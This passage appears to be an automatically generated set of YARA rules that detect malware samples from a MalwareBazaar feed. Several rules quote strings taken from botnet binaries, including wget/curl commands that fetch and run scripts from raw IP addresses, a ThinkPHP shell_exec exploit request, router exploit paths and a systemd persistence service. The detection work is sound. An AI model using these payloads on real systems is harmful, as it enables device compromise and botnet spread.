        $s15 = "<Module>{1e3d2d65-b607-41f3-826b-399da6fb6c49}"
        $s16 = "kernel32.dll"
        $s17 = "CreateRemoteThread"
        $s18 = "System.Threading.Tasks"
        $s19 = "Module"
        $s20 = "System.Collections.Generic"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1024KB and
        all of them
}

rule Linux_8b4fa0c77e55b191f3249468db847a346235f682398d37642488c1f26b6cc9fc
{
    meta:
        description = "Auto ML: 8b4fa0c77e55b191f3249468db847a346235f682398d37642488c1f26b6cc9fc"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "DWin+D"
        $s2 = "BSetY"
        $s3 = "PROT_EXEC|PROT_WRITE failed."
        $s4 = "$Info: This file is packed with the UPX executable packer http://upx.sf.net $"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 1222KB and
        all of them
}

rule Windows_8b6cc57f1b2da7e7b703b181f91ab63dce0891eae4ccfeb6e42452bdb02aa97a
{
    meta:
        description = "Auto ML: 8b6cc57f1b2da7e7b703b181f91ab63dce0891eae4ccfeb6e42452bdb02aa97a"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "``.data"
        $s3 = ".rdata"
        $s4 = ".rsrc"
        $s5 = ".reloc"
        $s6 = "SystemFuH"
        $s7 = "RtlGetCuH"
        $s8 = "tlGetCurH"
        $s9 = "RtlGetNtH"
        $s10 = "WSAGetOvH"
        $s11 = "wine_getH"
        $s12 = "GetSysteH"
        $s13 = "time.DatH"
        $s14 = ";fileu"
        $s15 = "?fileumH"
        $s16 = ":windu"
        $s17 = "8windu fA"
        $s18 = "8open"
        $s19 = "9fileu"
        $s20 = ">fileuF"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 6801KB and
        all of them
}

rule Windows_8be7871aecfc2e3039cefaeab9954a4ee7903ece4099bfa295936b030764f521
{
    meta:
        description = "Auto ML: 8be7871aecfc2e3039cefaeab9954a4ee7903ece4099bfa295936b030764f521"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "ThreadSafeObjectProvider`1"
        $s5 = "kernel32"
        $s6 = "Microsoft.Win32"
        $s7 = "user32"
        $s8 = "<Module>"
        $s9 = "GetWindowTextLengthA"
        $s10 = "GetVolumeInformationA"
        $s11 = "capGetDriverDescriptionA"
        $s12 = "GetWindowTextA"
        $s13 = "System.IO"
        $s14 = "Create__Instance__"
        $s15 = "DownloadData"
        $s16 = "GetWindowThreadProcessId"
        $s17 = "GetProcessById"
        $s18 = "Read"
        $s19 = "Thread"
        $s20 = "Load"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 30KB and
        all of them
}

rule Linux_8c8aaca5e8603bb34ff88481ce9525a163c97d0e57a00b04f4b9df35f0bd17f9
{
    meta:
        description = "Auto ML: 8c8aaca5e8603bb34ff88481ce9525a163c97d0e57a00b04f4b9df35f0bd17f9"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "POST /ctrlt/DeviceUpgrade_1 HTTP/1.1"
        $s2 = "Connection: keep-alive"
        $s3 = "/proc/self/cmdline"
        $s4 = "No such file or directory"
        $s5 = "No such process"
        $s6 = "Interrupted system call"
        $s7 = "Bad file descriptor"
        $s8 = "No child processes"
        $s9 = "Resource temporarily unavailable"
        $s10 = "File exists"
        $s11 = "Too many open files in system"
        $s12 = "Too many open files"
        $s13 = "Text file busy"
        $s14 = "File too large"
        $s15 = "Read-only file system"
        $s16 = "File name too long"
        $s17 = "Level 3 reset"
        $s18 = "Bad font file format"
        $s19 = "Multihop attempted"
        $s20 = "File descriptor in bad state"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 79KB and
        all of them
}

rule Windows_8c8bc051a42578631ab04380a0daef57e67abd8cf1a272e75213285929a74c5e
{
    meta:
        description = "Auto ML: 8c8bc051a42578631ab04380a0daef57e67abd8cf1a272e75213285929a74c5e"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = ".rsrc"
        $s3 = "kernel32.dll"
        $s4 = "Shlwapi.dll"
        $s5 = "msvcrt.dll"
        $s6 = "CreateThread"
        $s7 = "ExitProcess"
        $s8 = "GetComputerNameA"
        $s9 = "GetModuleFileNameA"
        $s10 = "GetModuleHandleW"
        $s11 = "GetProcAddress"
        $s12 = "SetErrorMode"
        $s13 = "PathFindFileNameA"
        $s14 = "memset"
        $s15 = "<assemblyIdentity type=\"win32\" name=\"Microsoft.Windows.Common-Controls\" version=\"6.0.0.0\" processorArchitecture=\"*\" publicKeyToken=\"6595b64144ccf1df\" language=\"*\" />"
        $s16 = "WINT"
    condition:
        uint32(0) == 0x00805a4d and
        filesize < 11436KB and
        all of them
}

rule Windows_8c93c797c09d3b9480c9ff4c29b8573f61dad79c544b145fd61007209a635068
{
    meta:
        description = "Auto ML: 8c93c797c09d3b9480c9ff4c29b8573f61dad79c544b145fd61007209a635068"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "PURCHASE_ORDER_AH00112122023.exe"
        $s5 = "<Module>"
        $s6 = "PURCHASE_ORDER_AH00112122023.Common"
        $s7 = "System"
        $s8 = "GetterModelConfig"
        $s9 = "Thread"
        $s10 = "Processor"
        $s11 = "Connection"
        $s12 = "ProcessorServerDef"
        $s13 = "TemplateClass"
        $s14 = "CreateInstanceGrbit"
        $s15 = "ProcessClassStructBuilder"
        $s16 = "SqlCommandColumnEncryptionSetting"
        $s17 = "WriterModelConfig"
        $s18 = "ProcessClass"
        $s19 = "ReaderModelConfig"
        $s20 = "TemplateCodeAuth"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 879KB and
        all of them
}

rule Windows_8cbee06cc554d522b77c75779cc6ca51f52e77accbf492670c4677c3d6abb88e
{
    meta:
        description = "Auto ML: 8cbee06cc554d522b77c75779cc6ca51f52e77accbf492670c4677c3d6abb88e"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "FlsSetValue"
        $s6 = "FlsGetValue"
        $s7 = "CorExitProcess"
        $s8 = "An application has made an attempt to load the C runtime library incorrectly."
        $s9 = "- Attempt to use MSIL code from this assembly during native code initialization"
        $s10 = "- Attempt to initialize the CRT more than once."
        $s11 = "- unable to open console device"
        $s12 = "- unexpected multithread lock error"
        $s13 = "- not enough space for thread data"
        $s14 = "- floating point support not loaded"
        $s15 = "`local static thread guard'"
        $s16 = "`placement delete[] closure'"
        $s17 = "`placement delete closure'"
        $s18 = "delete[]"
        $s19 = "delete"
        $s20 = "`non-type-template-parameter"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 233KB and
        all of them
}

rule Windows_8cd916321f1c8a63bd9fafb52a478ac65b3e86a33966bbfce60f5e46ffee6b8c
{
    meta:
        description = "Auto ML: 8cd916321f1c8a63bd9fafb52a478ac65b3e86a33966bbfce60f5e46ffee6b8c"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "@.reloc"
        $s6 = "http="
        $s7 = "https="
        $s8 = "WinHttpGetProxyForUrl"
        $s9 = "winhttp.dll"
        $s10 = "WinHttpGetIEProxyConfigForCurrentUser"
        $s11 = "WinHttpCloseHandle"
        $s12 = "WinHttpOpen"
        $s13 = "InternetOpenA"
        $s14 = "wininet.dll"
        $s15 = "InternetOpenUrlA"
        $s16 = "InternetReadFile"
        $s17 = "InternetCloseHandle"
        $s18 = "InternetSetOptionA"
        $s19 = "HttpQueryInfoA"
        $s20 = "msvcrt.dll"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 112KB and
        all of them
}

rule Linux_0cffb72162b52e0036b5f73bd7dffdfa0fbaaf8caa19f5692f9db58cfd5382b2
{
    meta:
        description = "Auto ML: 0cffb72162b52e0036b5f73bd7dffdfa0fbaaf8caa19f5692f9db58cfd5382b2"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "HTTP/1.1"
        $s2 = "/cmdline"
        $s3 = "/wget"
        $s4 = "/bin/bash -c \"/bin/wget http://82.165.215.205/bins/bins.sh; chmod +x bins.sh; sh bins.sh; /bin/curl -k -L --output bins.sh http://82.165.215.205/bins/bins.sh; chmod +x bins.sh; sh bins.sh\""
        $s5 = "After=network.target"
        $s6 = "User=root"
        $s7 = "WantedBy=multi-user.target"
        $s8 = "/lib/systemd/system/bot.service"
        $s9 = "/bin/systemctl enable bot"
        $s10 = "No such file or directory"
        $s11 = "No such process"
        $s12 = "Interrupted system call"
        $s13 = "Bad file descriptor"
        $s14 = "No child processes"
        $s15 = "Resource temporarily unavailable"
        $s16 = "File exists"
        $s17 = "Too many open files in system"
        $s18 = "Too many open files"
        $s19 = "Text file busy"
        $s20 = "File too large"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 68KB and
        all of them
}

rule Linux_8cf2fcff837e7b78adda114235353380f69d5730993501db605a69ceae109455
{
    meta:
        description = "Auto ML: 8cf2fcff837e7b78adda114235353380f69d5730993501db605a69ceae109455"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "POST /ctrlt/DeviceUpgrade_1 HTTP/1.1"
        $s2 = "Connection: keep-alive"
        $s3 = "GET /index.php?s=/index/"
        $s4 = "pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]='wget http://2.58.113.120/bins/x86 -O thonkphp ; chmod 777 thonkphp ; ./thonkphp ThinkPHP ; rm -rf thinkphp' HTTP/1.1"
        $s5 = "User-Agent: Uirusu/2.0"
        $s6 = "POST /cgi-bin/ViewLog.asp HTTP/1.1"
        $s7 = "User-Agent: python-requests/2.20.0"
        $s8 = "/bin/busybox wget http://2.58.113.120/zyxel.sh; chmod +x zyxel.sh; ./zyxel.sh"
        $s9 = "processor"
        $s10 = "/sys/devices/system/cpu"
        $s11 = "_Unwind_VRS_Get"
        $s12 = "_Unwind_VRS_Set"
        $s13 = "_Unwind_GetCFA"
        $s14 = "_Unwind_Complete"
        $s15 = "_Unwind_DeleteException"
        $s16 = "_Unwind_GetTextRelBase"
        $s17 = "_Unwind_GetDataRelBase"
        $s18 = "__gnu_Unwind_ForcedUnwind"
        $s19 = "__gnu_Unwind_Resume"
        $s20 = "__gnu_Unwind_RaiseException"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 154KB and
        all of them
}

rule Windows_8d074060c491ad1e1366486ea95b2c11913423dbf978f8aa4748de9bdcaf7c4e
{
    meta:
        description = "Auto ML: 8d074060c491ad1e1366486ea95b2c11913423dbf978f8aa4748de9bdcaf7c4e"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "ThreadSafeObjectProvider`1"
        $s5 = "Microsoft.Win32"
        $s6 = "Jnm2ijuE25FnSf1hkrVTrGc982XGk8dqhmFreFUybTGX3ni85kkMFoynhQwintIP1Q8eErXxwvGYmV75"
        $s7 = "<Module>"
        $s8 = "capGetDriverDescriptionA"
        $s9 = "capCreateCaptureWindowA"
        $s10 = "ES_SYSTEM_REQUIRED"
        $s11 = "get_ASCII"
        $s12 = "System.IO"
        $s13 = "Create__Instance__"
        $s14 = "System.Collections.Generic"
        $s15 = "Thread"
        $s16 = "Load"
        $s17 = "get_Elapsed"
        $s18 = "RegistryValueKind"
        $s19 = "set_Method"
        $s20 = "CreateInstance"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 59KB and
        all of them
}

rule Windows_8d1bfbe0d300231cf7892a9be51258a77f52a85eac045cb42a64b357702c0c5f
{
    meta:
        description = "Auto ML: 8d1bfbe0d300231cf7892a9be51258a77f52a85eac045cb42a64b357702c0c5f"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "<Module>"
        $s5 = "System.Runtime.CompilerServices"
        $s6 = "System.ComponentModel"
        $s7 = "System.CodeDom.Compiler"
        $s8 = "System.Diagnostics"
        $s9 = "DebuggerNonUserCodeAttribute"
        $s10 = "System"
        $s11 = "Microsoft.VisualBasic.CompilerServices"
        $s12 = "StandardModuleAttribute"
        $s13 = "HideModuleNameAttribute"
        $s14 = "GetObjectValue"
        $s15 = "GetHashCode"
        $s16 = "GetTypeFromHandle"
        $s17 = "CreateInstance"
        $s18 = "System.Runtime.InteropServices"
        $s19 = "ThreadStaticAttribute"
        $s20 = "m_ThreadStaticValue"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 37KB and
        all of them
}

rule Windows_8d33b05e47547b982e0306165ae7d8441147db984e72adb5632ac2b9bcf6bc8f
{
    meta:
        description = "Auto ML: 8d33b05e47547b982e0306165ae7d8441147db984e72adb5632ac2b9bcf6bc8f"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.data"
        $s3 = ".rsrc"
        $s4 = "MSVBVM60.DLL"
        $s5 = "Install, Setup or Update"
        $s6 = "This sets the present colors as default. When you restart, these will be the colors that appear."
        $s7 = "This resets the default colors. When you restart, these will be the colors that appear."
        $s8 = "This sets the size as the default. Use it to create shapes of the same size."
        $s9 = "MSComDlg.CommonDialog"
        $s10 = "Toggle Display Window"
        $s11 = "ConnectingLine"
        $s12 = "mnuFile"
        $s13 = "&File"
        $s14 = "mnuOpen"
        $s15 = "&Open..."
        $s16 = "ReadyState"
        $s17 = "Shdocvw.dll"
        $s18 = "OWC11.Spreadsheet"
        $s19 = "Spreadsheet"
        $s20 = "WindowEditor"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 5252KB and
        all of them
}

rule Windows_8d4d7a9744daead89a8e5af92249aa6d709e4f91ff33c774ba6e8c8289ec2020
{
    meta:
        description = "Auto ML: 8d4d7a9744daead89a8e5af92249aa6d709e4f91ff33c774ba6e8c8289ec2020"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "This program must be run under Win32"
        $s2 = ".rdata"
        $s3 = "P.reloc"
        $s4 = "P.rsrc"
        $s5 = "kernel32.dll"
        $s6 = "GetCurrentThreadId"
        $s7 = "SetCurrentDirectoryA"
        $s8 = "GetCurrentDirectoryA"
        $s9 = "ExitProcess"
        $s10 = "RtlUnwind"
        $s11 = "TlsSetValue"
        $s12 = "TlsGetValue"
        $s13 = "GetModuleHandleA"
        $s14 = "GetProcessHeap"
        $s15 = "WriteFile"
        $s16 = "SetFilePointer"
        $s17 = "LoadResource"
        $s18 = "GetWindowsDirectoryA"
        $s19 = "GetTempPathA"
        $s20 = "GetSystemDirectoryA"
    condition:
        uint32(0) == 0x00505a4d and
        filesize < 4620KB and
        all of them
}

rule Linux_8d6b1aa71dbee2f1421b121608685259d4f7266d441023725732c8d32732e2a8
{
    meta:
        description = "Auto ML: 8d6b1aa71dbee2f1421b121608685259d4f7266d441023725732c8d32732e2a8"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "(!PROT_EXEC|PROT_WRITE failed."
        $s2 = "$Info: This file is packed with the UPX executable packer http://upx.sf.net $"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 34KB and
        all of them
}

rule Windows_8d6c9fdb875cc3e3048b4852b8bc60aff5d071270ba3bf976445534250cd5f09
{
    meta:
        description = "Auto ML: 8d6c9fdb875cc3e3048b4852b8bc60aff5d071270ba3bf976445534250cd5f09"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = ".reloc"
        $s4 = "System.Reflection"
        $s5 = "System"
        $s6 = "System.Runtime.CompilerServices"
        $s7 = "System.Runtime.InteropServices"
        $s8 = "System.Diagnostics"
        $s9 = "TargetFrameworkAttribute"
        $s10 = "System.Runtime.Versioning"
        $s11 = "AssemblyFileVersionAttribute"
        $s12 = "Framework.exe"
        $s13 = "<Module>"
        $s14 = "<Module>{5CE6B055-6E48-4797-9C1E-12E9BCF437A2}"
        $s15 = "<Module>{8643064c-5e44-4a26-a798-09504fab7f89}"
        $s16 = "kernel32.dll"
        $s17 = "CreateRemoteThread"
        $s18 = "System.IO"
        $s19 = "Module"
        $s20 = "System.Collections.Generic"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 579KB and
        all of them
}

rule Windows_8d8533278822162961e4bc205ed8e8ca33254c6653ce90bf22f8f25580d72ab1
{
    meta:
        description = "Auto ML: 8d8533278822162961e4bc205ed8e8ca33254c6653ce90bf22f8f25580d72ab1"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "GameSettingsForm_Load_1"
        $s5 = "get_Item1"
        $s6 = "get_Player1"
        $s7 = "get_Item2"
        $s8 = "get_Player2"
        $s9 = "<Module>"
        $s10 = "get_cvcN"
        $s11 = "getInstancia"
        $s12 = "get_paginaWebEmpresa"
        $s13 = "set_paginaWebEmpresa"
        $s14 = "get_razonSocialEmpresa"
        $s15 = "set_razonSocialEmpresa"
        $s16 = "get_direccionEmpresa"
        $s17 = "set_direccionEmpresa"
        $s18 = "get_correoEmpresa"
        $s19 = "set_correoEmpresa"
        $s20 = "get_telefonoEmpresa"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 504KB and
        all of them
}

rule Windows_8d9576f6e8f69212d075b96842038e7353b5918919dad3b24859dbf4eabc80a9
{
    meta:
        description = "Auto ML: 8d9576f6e8f69212d075b96842038e7353b5918919dad3b24859dbf4eabc80a9"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "@.reloc"
        $s6 = "GetNativeSystemInfo"
        $s7 = "kernel32.dll"
        $s8 = "FlsGetValue"
        $s9 = "FlsSetValue"
        $s10 = "delete"
        $s11 = "delete[]"
        $s12 = "`placement delete closure'"
        $s13 = "`placement delete[] closure'"
        $s14 = "`local static thread guard'"
        $s15 = "CorExitProcess"
        $s16 = "GetCurrentPackageId"
        $s17 = "GetDateFormatEx"
        $s18 = "GetSystemTimePreciseAsFileTime"
        $s19 = "GetTimeFormatEx"
        $s20 = "internal error: invalid forward reference offset"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1240KB and
        all of them
}

rule Linux_8d9ed544a9c0ccdbb620ebed506834a64f9f7932fcc446af50f5f9ac6170ce2f
{
    meta:
        description = "Auto ML: 8d9ed544a9c0ccdbb620ebed506834a64f9f7932fcc446af50f5f9ac6170ce2f"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "Windows XP"
        $s2 = "M-SEARCH * HTTP/1.1"
        $s3 = "USER-AGENT: Google Chrome/60.0.3112.90 Windows"
        $s4 = "HTTP/1.1 404 Not Found"
        $s5 = "HTTP/1.1 200 OK"
        $s6 = "POST /ctrlt/DeviceUpgrade_1 HTTP/1.1"
        $s7 = "Connection: keep-alive"
        $s8 = "/proc/%d/cmdline"
        $s9 = "busybox wget"
        $s10 = "/usr/lib/systemd/systemd"
        $s11 = "shell"
        $s12 = "httpd"
        $s13 = "system"
        $s14 = "wget-log"
        $s15 = "1337SoraLOADER"
        $s16 = "nloads"
        $s17 = "elfLoad"
        $s18 = "/usr/libexec/openssh/sftp-server"
        $s19 = "POST /goform/set_LimitClient_cfg HTTP/1.1"
        $s20 = "Cookie: user=admin"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 105KB and
        all of them
}

rule Linux_0d906c688218ee0a23bfc6974eb6005991634dcd38c7f491a4f4dbeda43da71d
{
    meta:
        description = "Auto ML: 0d906c688218ee0a23bfc6974eb6005991634dcd38c7f491a4f4dbeda43da71d"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "HTTP/1.1"
        $s2 = "User-Agent:"
        $s3 = "[http flood] headers: \"%s\""
        $s4 = "http"
        $s5 = "socket:"
        $s6 = "No such file or directory"
        $s7 = "No such process"
        $s8 = "Interrupted system call"
        $s9 = "Bad file descriptor"
        $s10 = "No child processes"
        $s11 = "Resource temporarily unavailable"
        $s12 = "File exists"
        $s13 = "Too many open files in system"
        $s14 = "Too many open files"
        $s15 = "Text file busy"
        $s16 = "File too large"
        $s17 = "Read-only file system"
        $s18 = "File name too long"
        $s19 = "Level 3 reset"
        $s20 = "Bad font file format"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 84KB and
        all of them
}

rule Linux_8db753f0c572bb84e78d165cae9fc8f9efca13cb50871d7f306fecac21d16f05
{
    meta:
        description = "Auto ML: 8db753f0c572bb84e78d165cae9fc8f9efca13cb50871d7f306fecac21d16f05"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "M-SEARCH * HTTP/1.1"
        $s2 = "USER-AGENT: Google Chrome/60.0.3112.90 Windows"
        $s3 = "Windows XP"
        $s4 = "socket:["
        $s5 = ".text"
        $s6 = ".data"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 46KB and
        all of them
}

rule Windows_8dc99a54ad41d6eddef1c7d638bf28e332f4423763541e5ade32e8fc696ca3a2
{
    meta:
        description = "Auto ML: 8dc99a54ad41d6eddef1c7d638bf28e332f4423763541e5ade32e8fc696ca3a2"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "This program must be run under Win32"
        $s2 = ".rdata"
        $s3 = "P.reloc"
        $s4 = "P.rsrc"
        $s5 = "NewInstance"
        $s6 = "kernel32.dll"
        $s7 = "SetDllDirectoryW"
        $s8 = "SetSearchPathMode"
        $s9 = "SetProcessDEPPolicy"
        $s10 = "TEMP"
        $s11 = "USERPROFILE"
        $s12 = "GetUserDefaultUILanguage"
        $s13 = "TCustomFile"
        $s14 = "TFile"
        $s15 = "EFileError"
        $s16 = "File I/O error %d"
        $s17 = "TCompressedBlockReader"
        $s18 = "TSetupLanguageEntryA"
        $s19 = "The setup files are corrupted. Please obtain a new copy of the program."
        $s20 = "shell32.dll"
    condition:
        uint32(0) == 0x00505a4d and
        filesize < 4653KB and
        all of them
}

rule Windows_8dd62ac7109e2518c29ad610004eaf4fd3e1118c2fdbf359d580b0f8ac1589bb
{
    meta:
        description = "Auto ML: 8dd62ac7109e2518c29ad610004eaf4fd3e1118c2fdbf359d580b0f8ac1589bb"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "Microsoft.Win32"
        $s5 = "user32"
        $s6 = "ReadInt32"
        $s7 = "<Module>"
        $s8 = "SystemParametersInfoA"
        $s9 = "get_FormatID"
        $s10 = "get_ASCII"
        $s11 = "System.IO"
        $s12 = "System.Collections.Generic"
        $s13 = "GetWindowThreadProcessId"
        $s14 = "GetProcessById"
        $s15 = "EndRead"
        $s16 = "BeginRead"
        $s17 = "get_CurrentThread"
        $s18 = "Load"
        $s19 = "get_IsAttached"
        $s20 = "get_Connected"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 206KB and
        all of them
}

rule Linux_8dd86d54bf0c3b6f0884a32133b5bbf5184a62c12116c0cd70c66596cb6ee6a4
{
    meta:
        description = "Auto ML: 8dd86d54bf0c3b6f0884a32133b5bbf5184a62c12116c0cd70c66596cb6ee6a4"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "N^NuMozilla/4.0 (Compatible; MSIE 8.0; Windows NT 5.2; Trident/6.0)"
        $s2 = "Mozilla/4.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.0)"
        $s3 = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; pl) Opera 11.00"
        $s4 = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; en) Opera 11.00"
        $s5 = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; ja) Opera 11.00"
        $s6 = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; de) Opera 11.01"
        $s7 = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; fr) Opera 11.00"
        $s8 = "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36"
        $s9 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36"
        $s10 = "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"
        $s11 = "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:41.0) Gecko/20100101 Firefox/41.0"
        $s12 = "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.101 Safari/537.36"
        $s13 = "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.80 Safari/537.36"
        $s14 = "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"
        $s15 = "Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)"
        $s16 = "Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51"
        $s17 = "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36"
        $s18 = "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.94 Safari/537.36"
        $s19 = "Mozilla/4.0 (compatible; MSIE 9.0; Windows 98; .NET CLR 3.0.04506.30)"
        $s20 = "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 5.1; Trident/5.0)"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 116KB and
        all of them
}

rule Linux_8de19052409f19885f4c5c4088ec31254f5d35c6b5348d53d5ccb6f94210a684
{
    meta:
        description = "Auto ML: 8de19052409f19885f4c5c4088ec31254f5d35c6b5348d53d5ccb6f94210a684"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "Mozilla/4.0 (Compatible; MSIE 8.0; Windows NT 5.2; Trident/6.0)"
        $s2 = "Mozilla/4.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.0)"
        $s3 = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; pl) Opera 11.00"
        $s4 = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; en) Opera 11.00"
        $s5 = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; ja) Opera 11.00"
        $s6 = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; de) Opera 11.01"
        $s7 = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; fr) Opera 11.00"
        $s8 = "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36"
        $s9 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36"
        $s10 = "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"
        $s11 = "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:41.0) Gecko/20100101 Firefox/41.0"
        $s12 = "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.101 Safari/537.36"
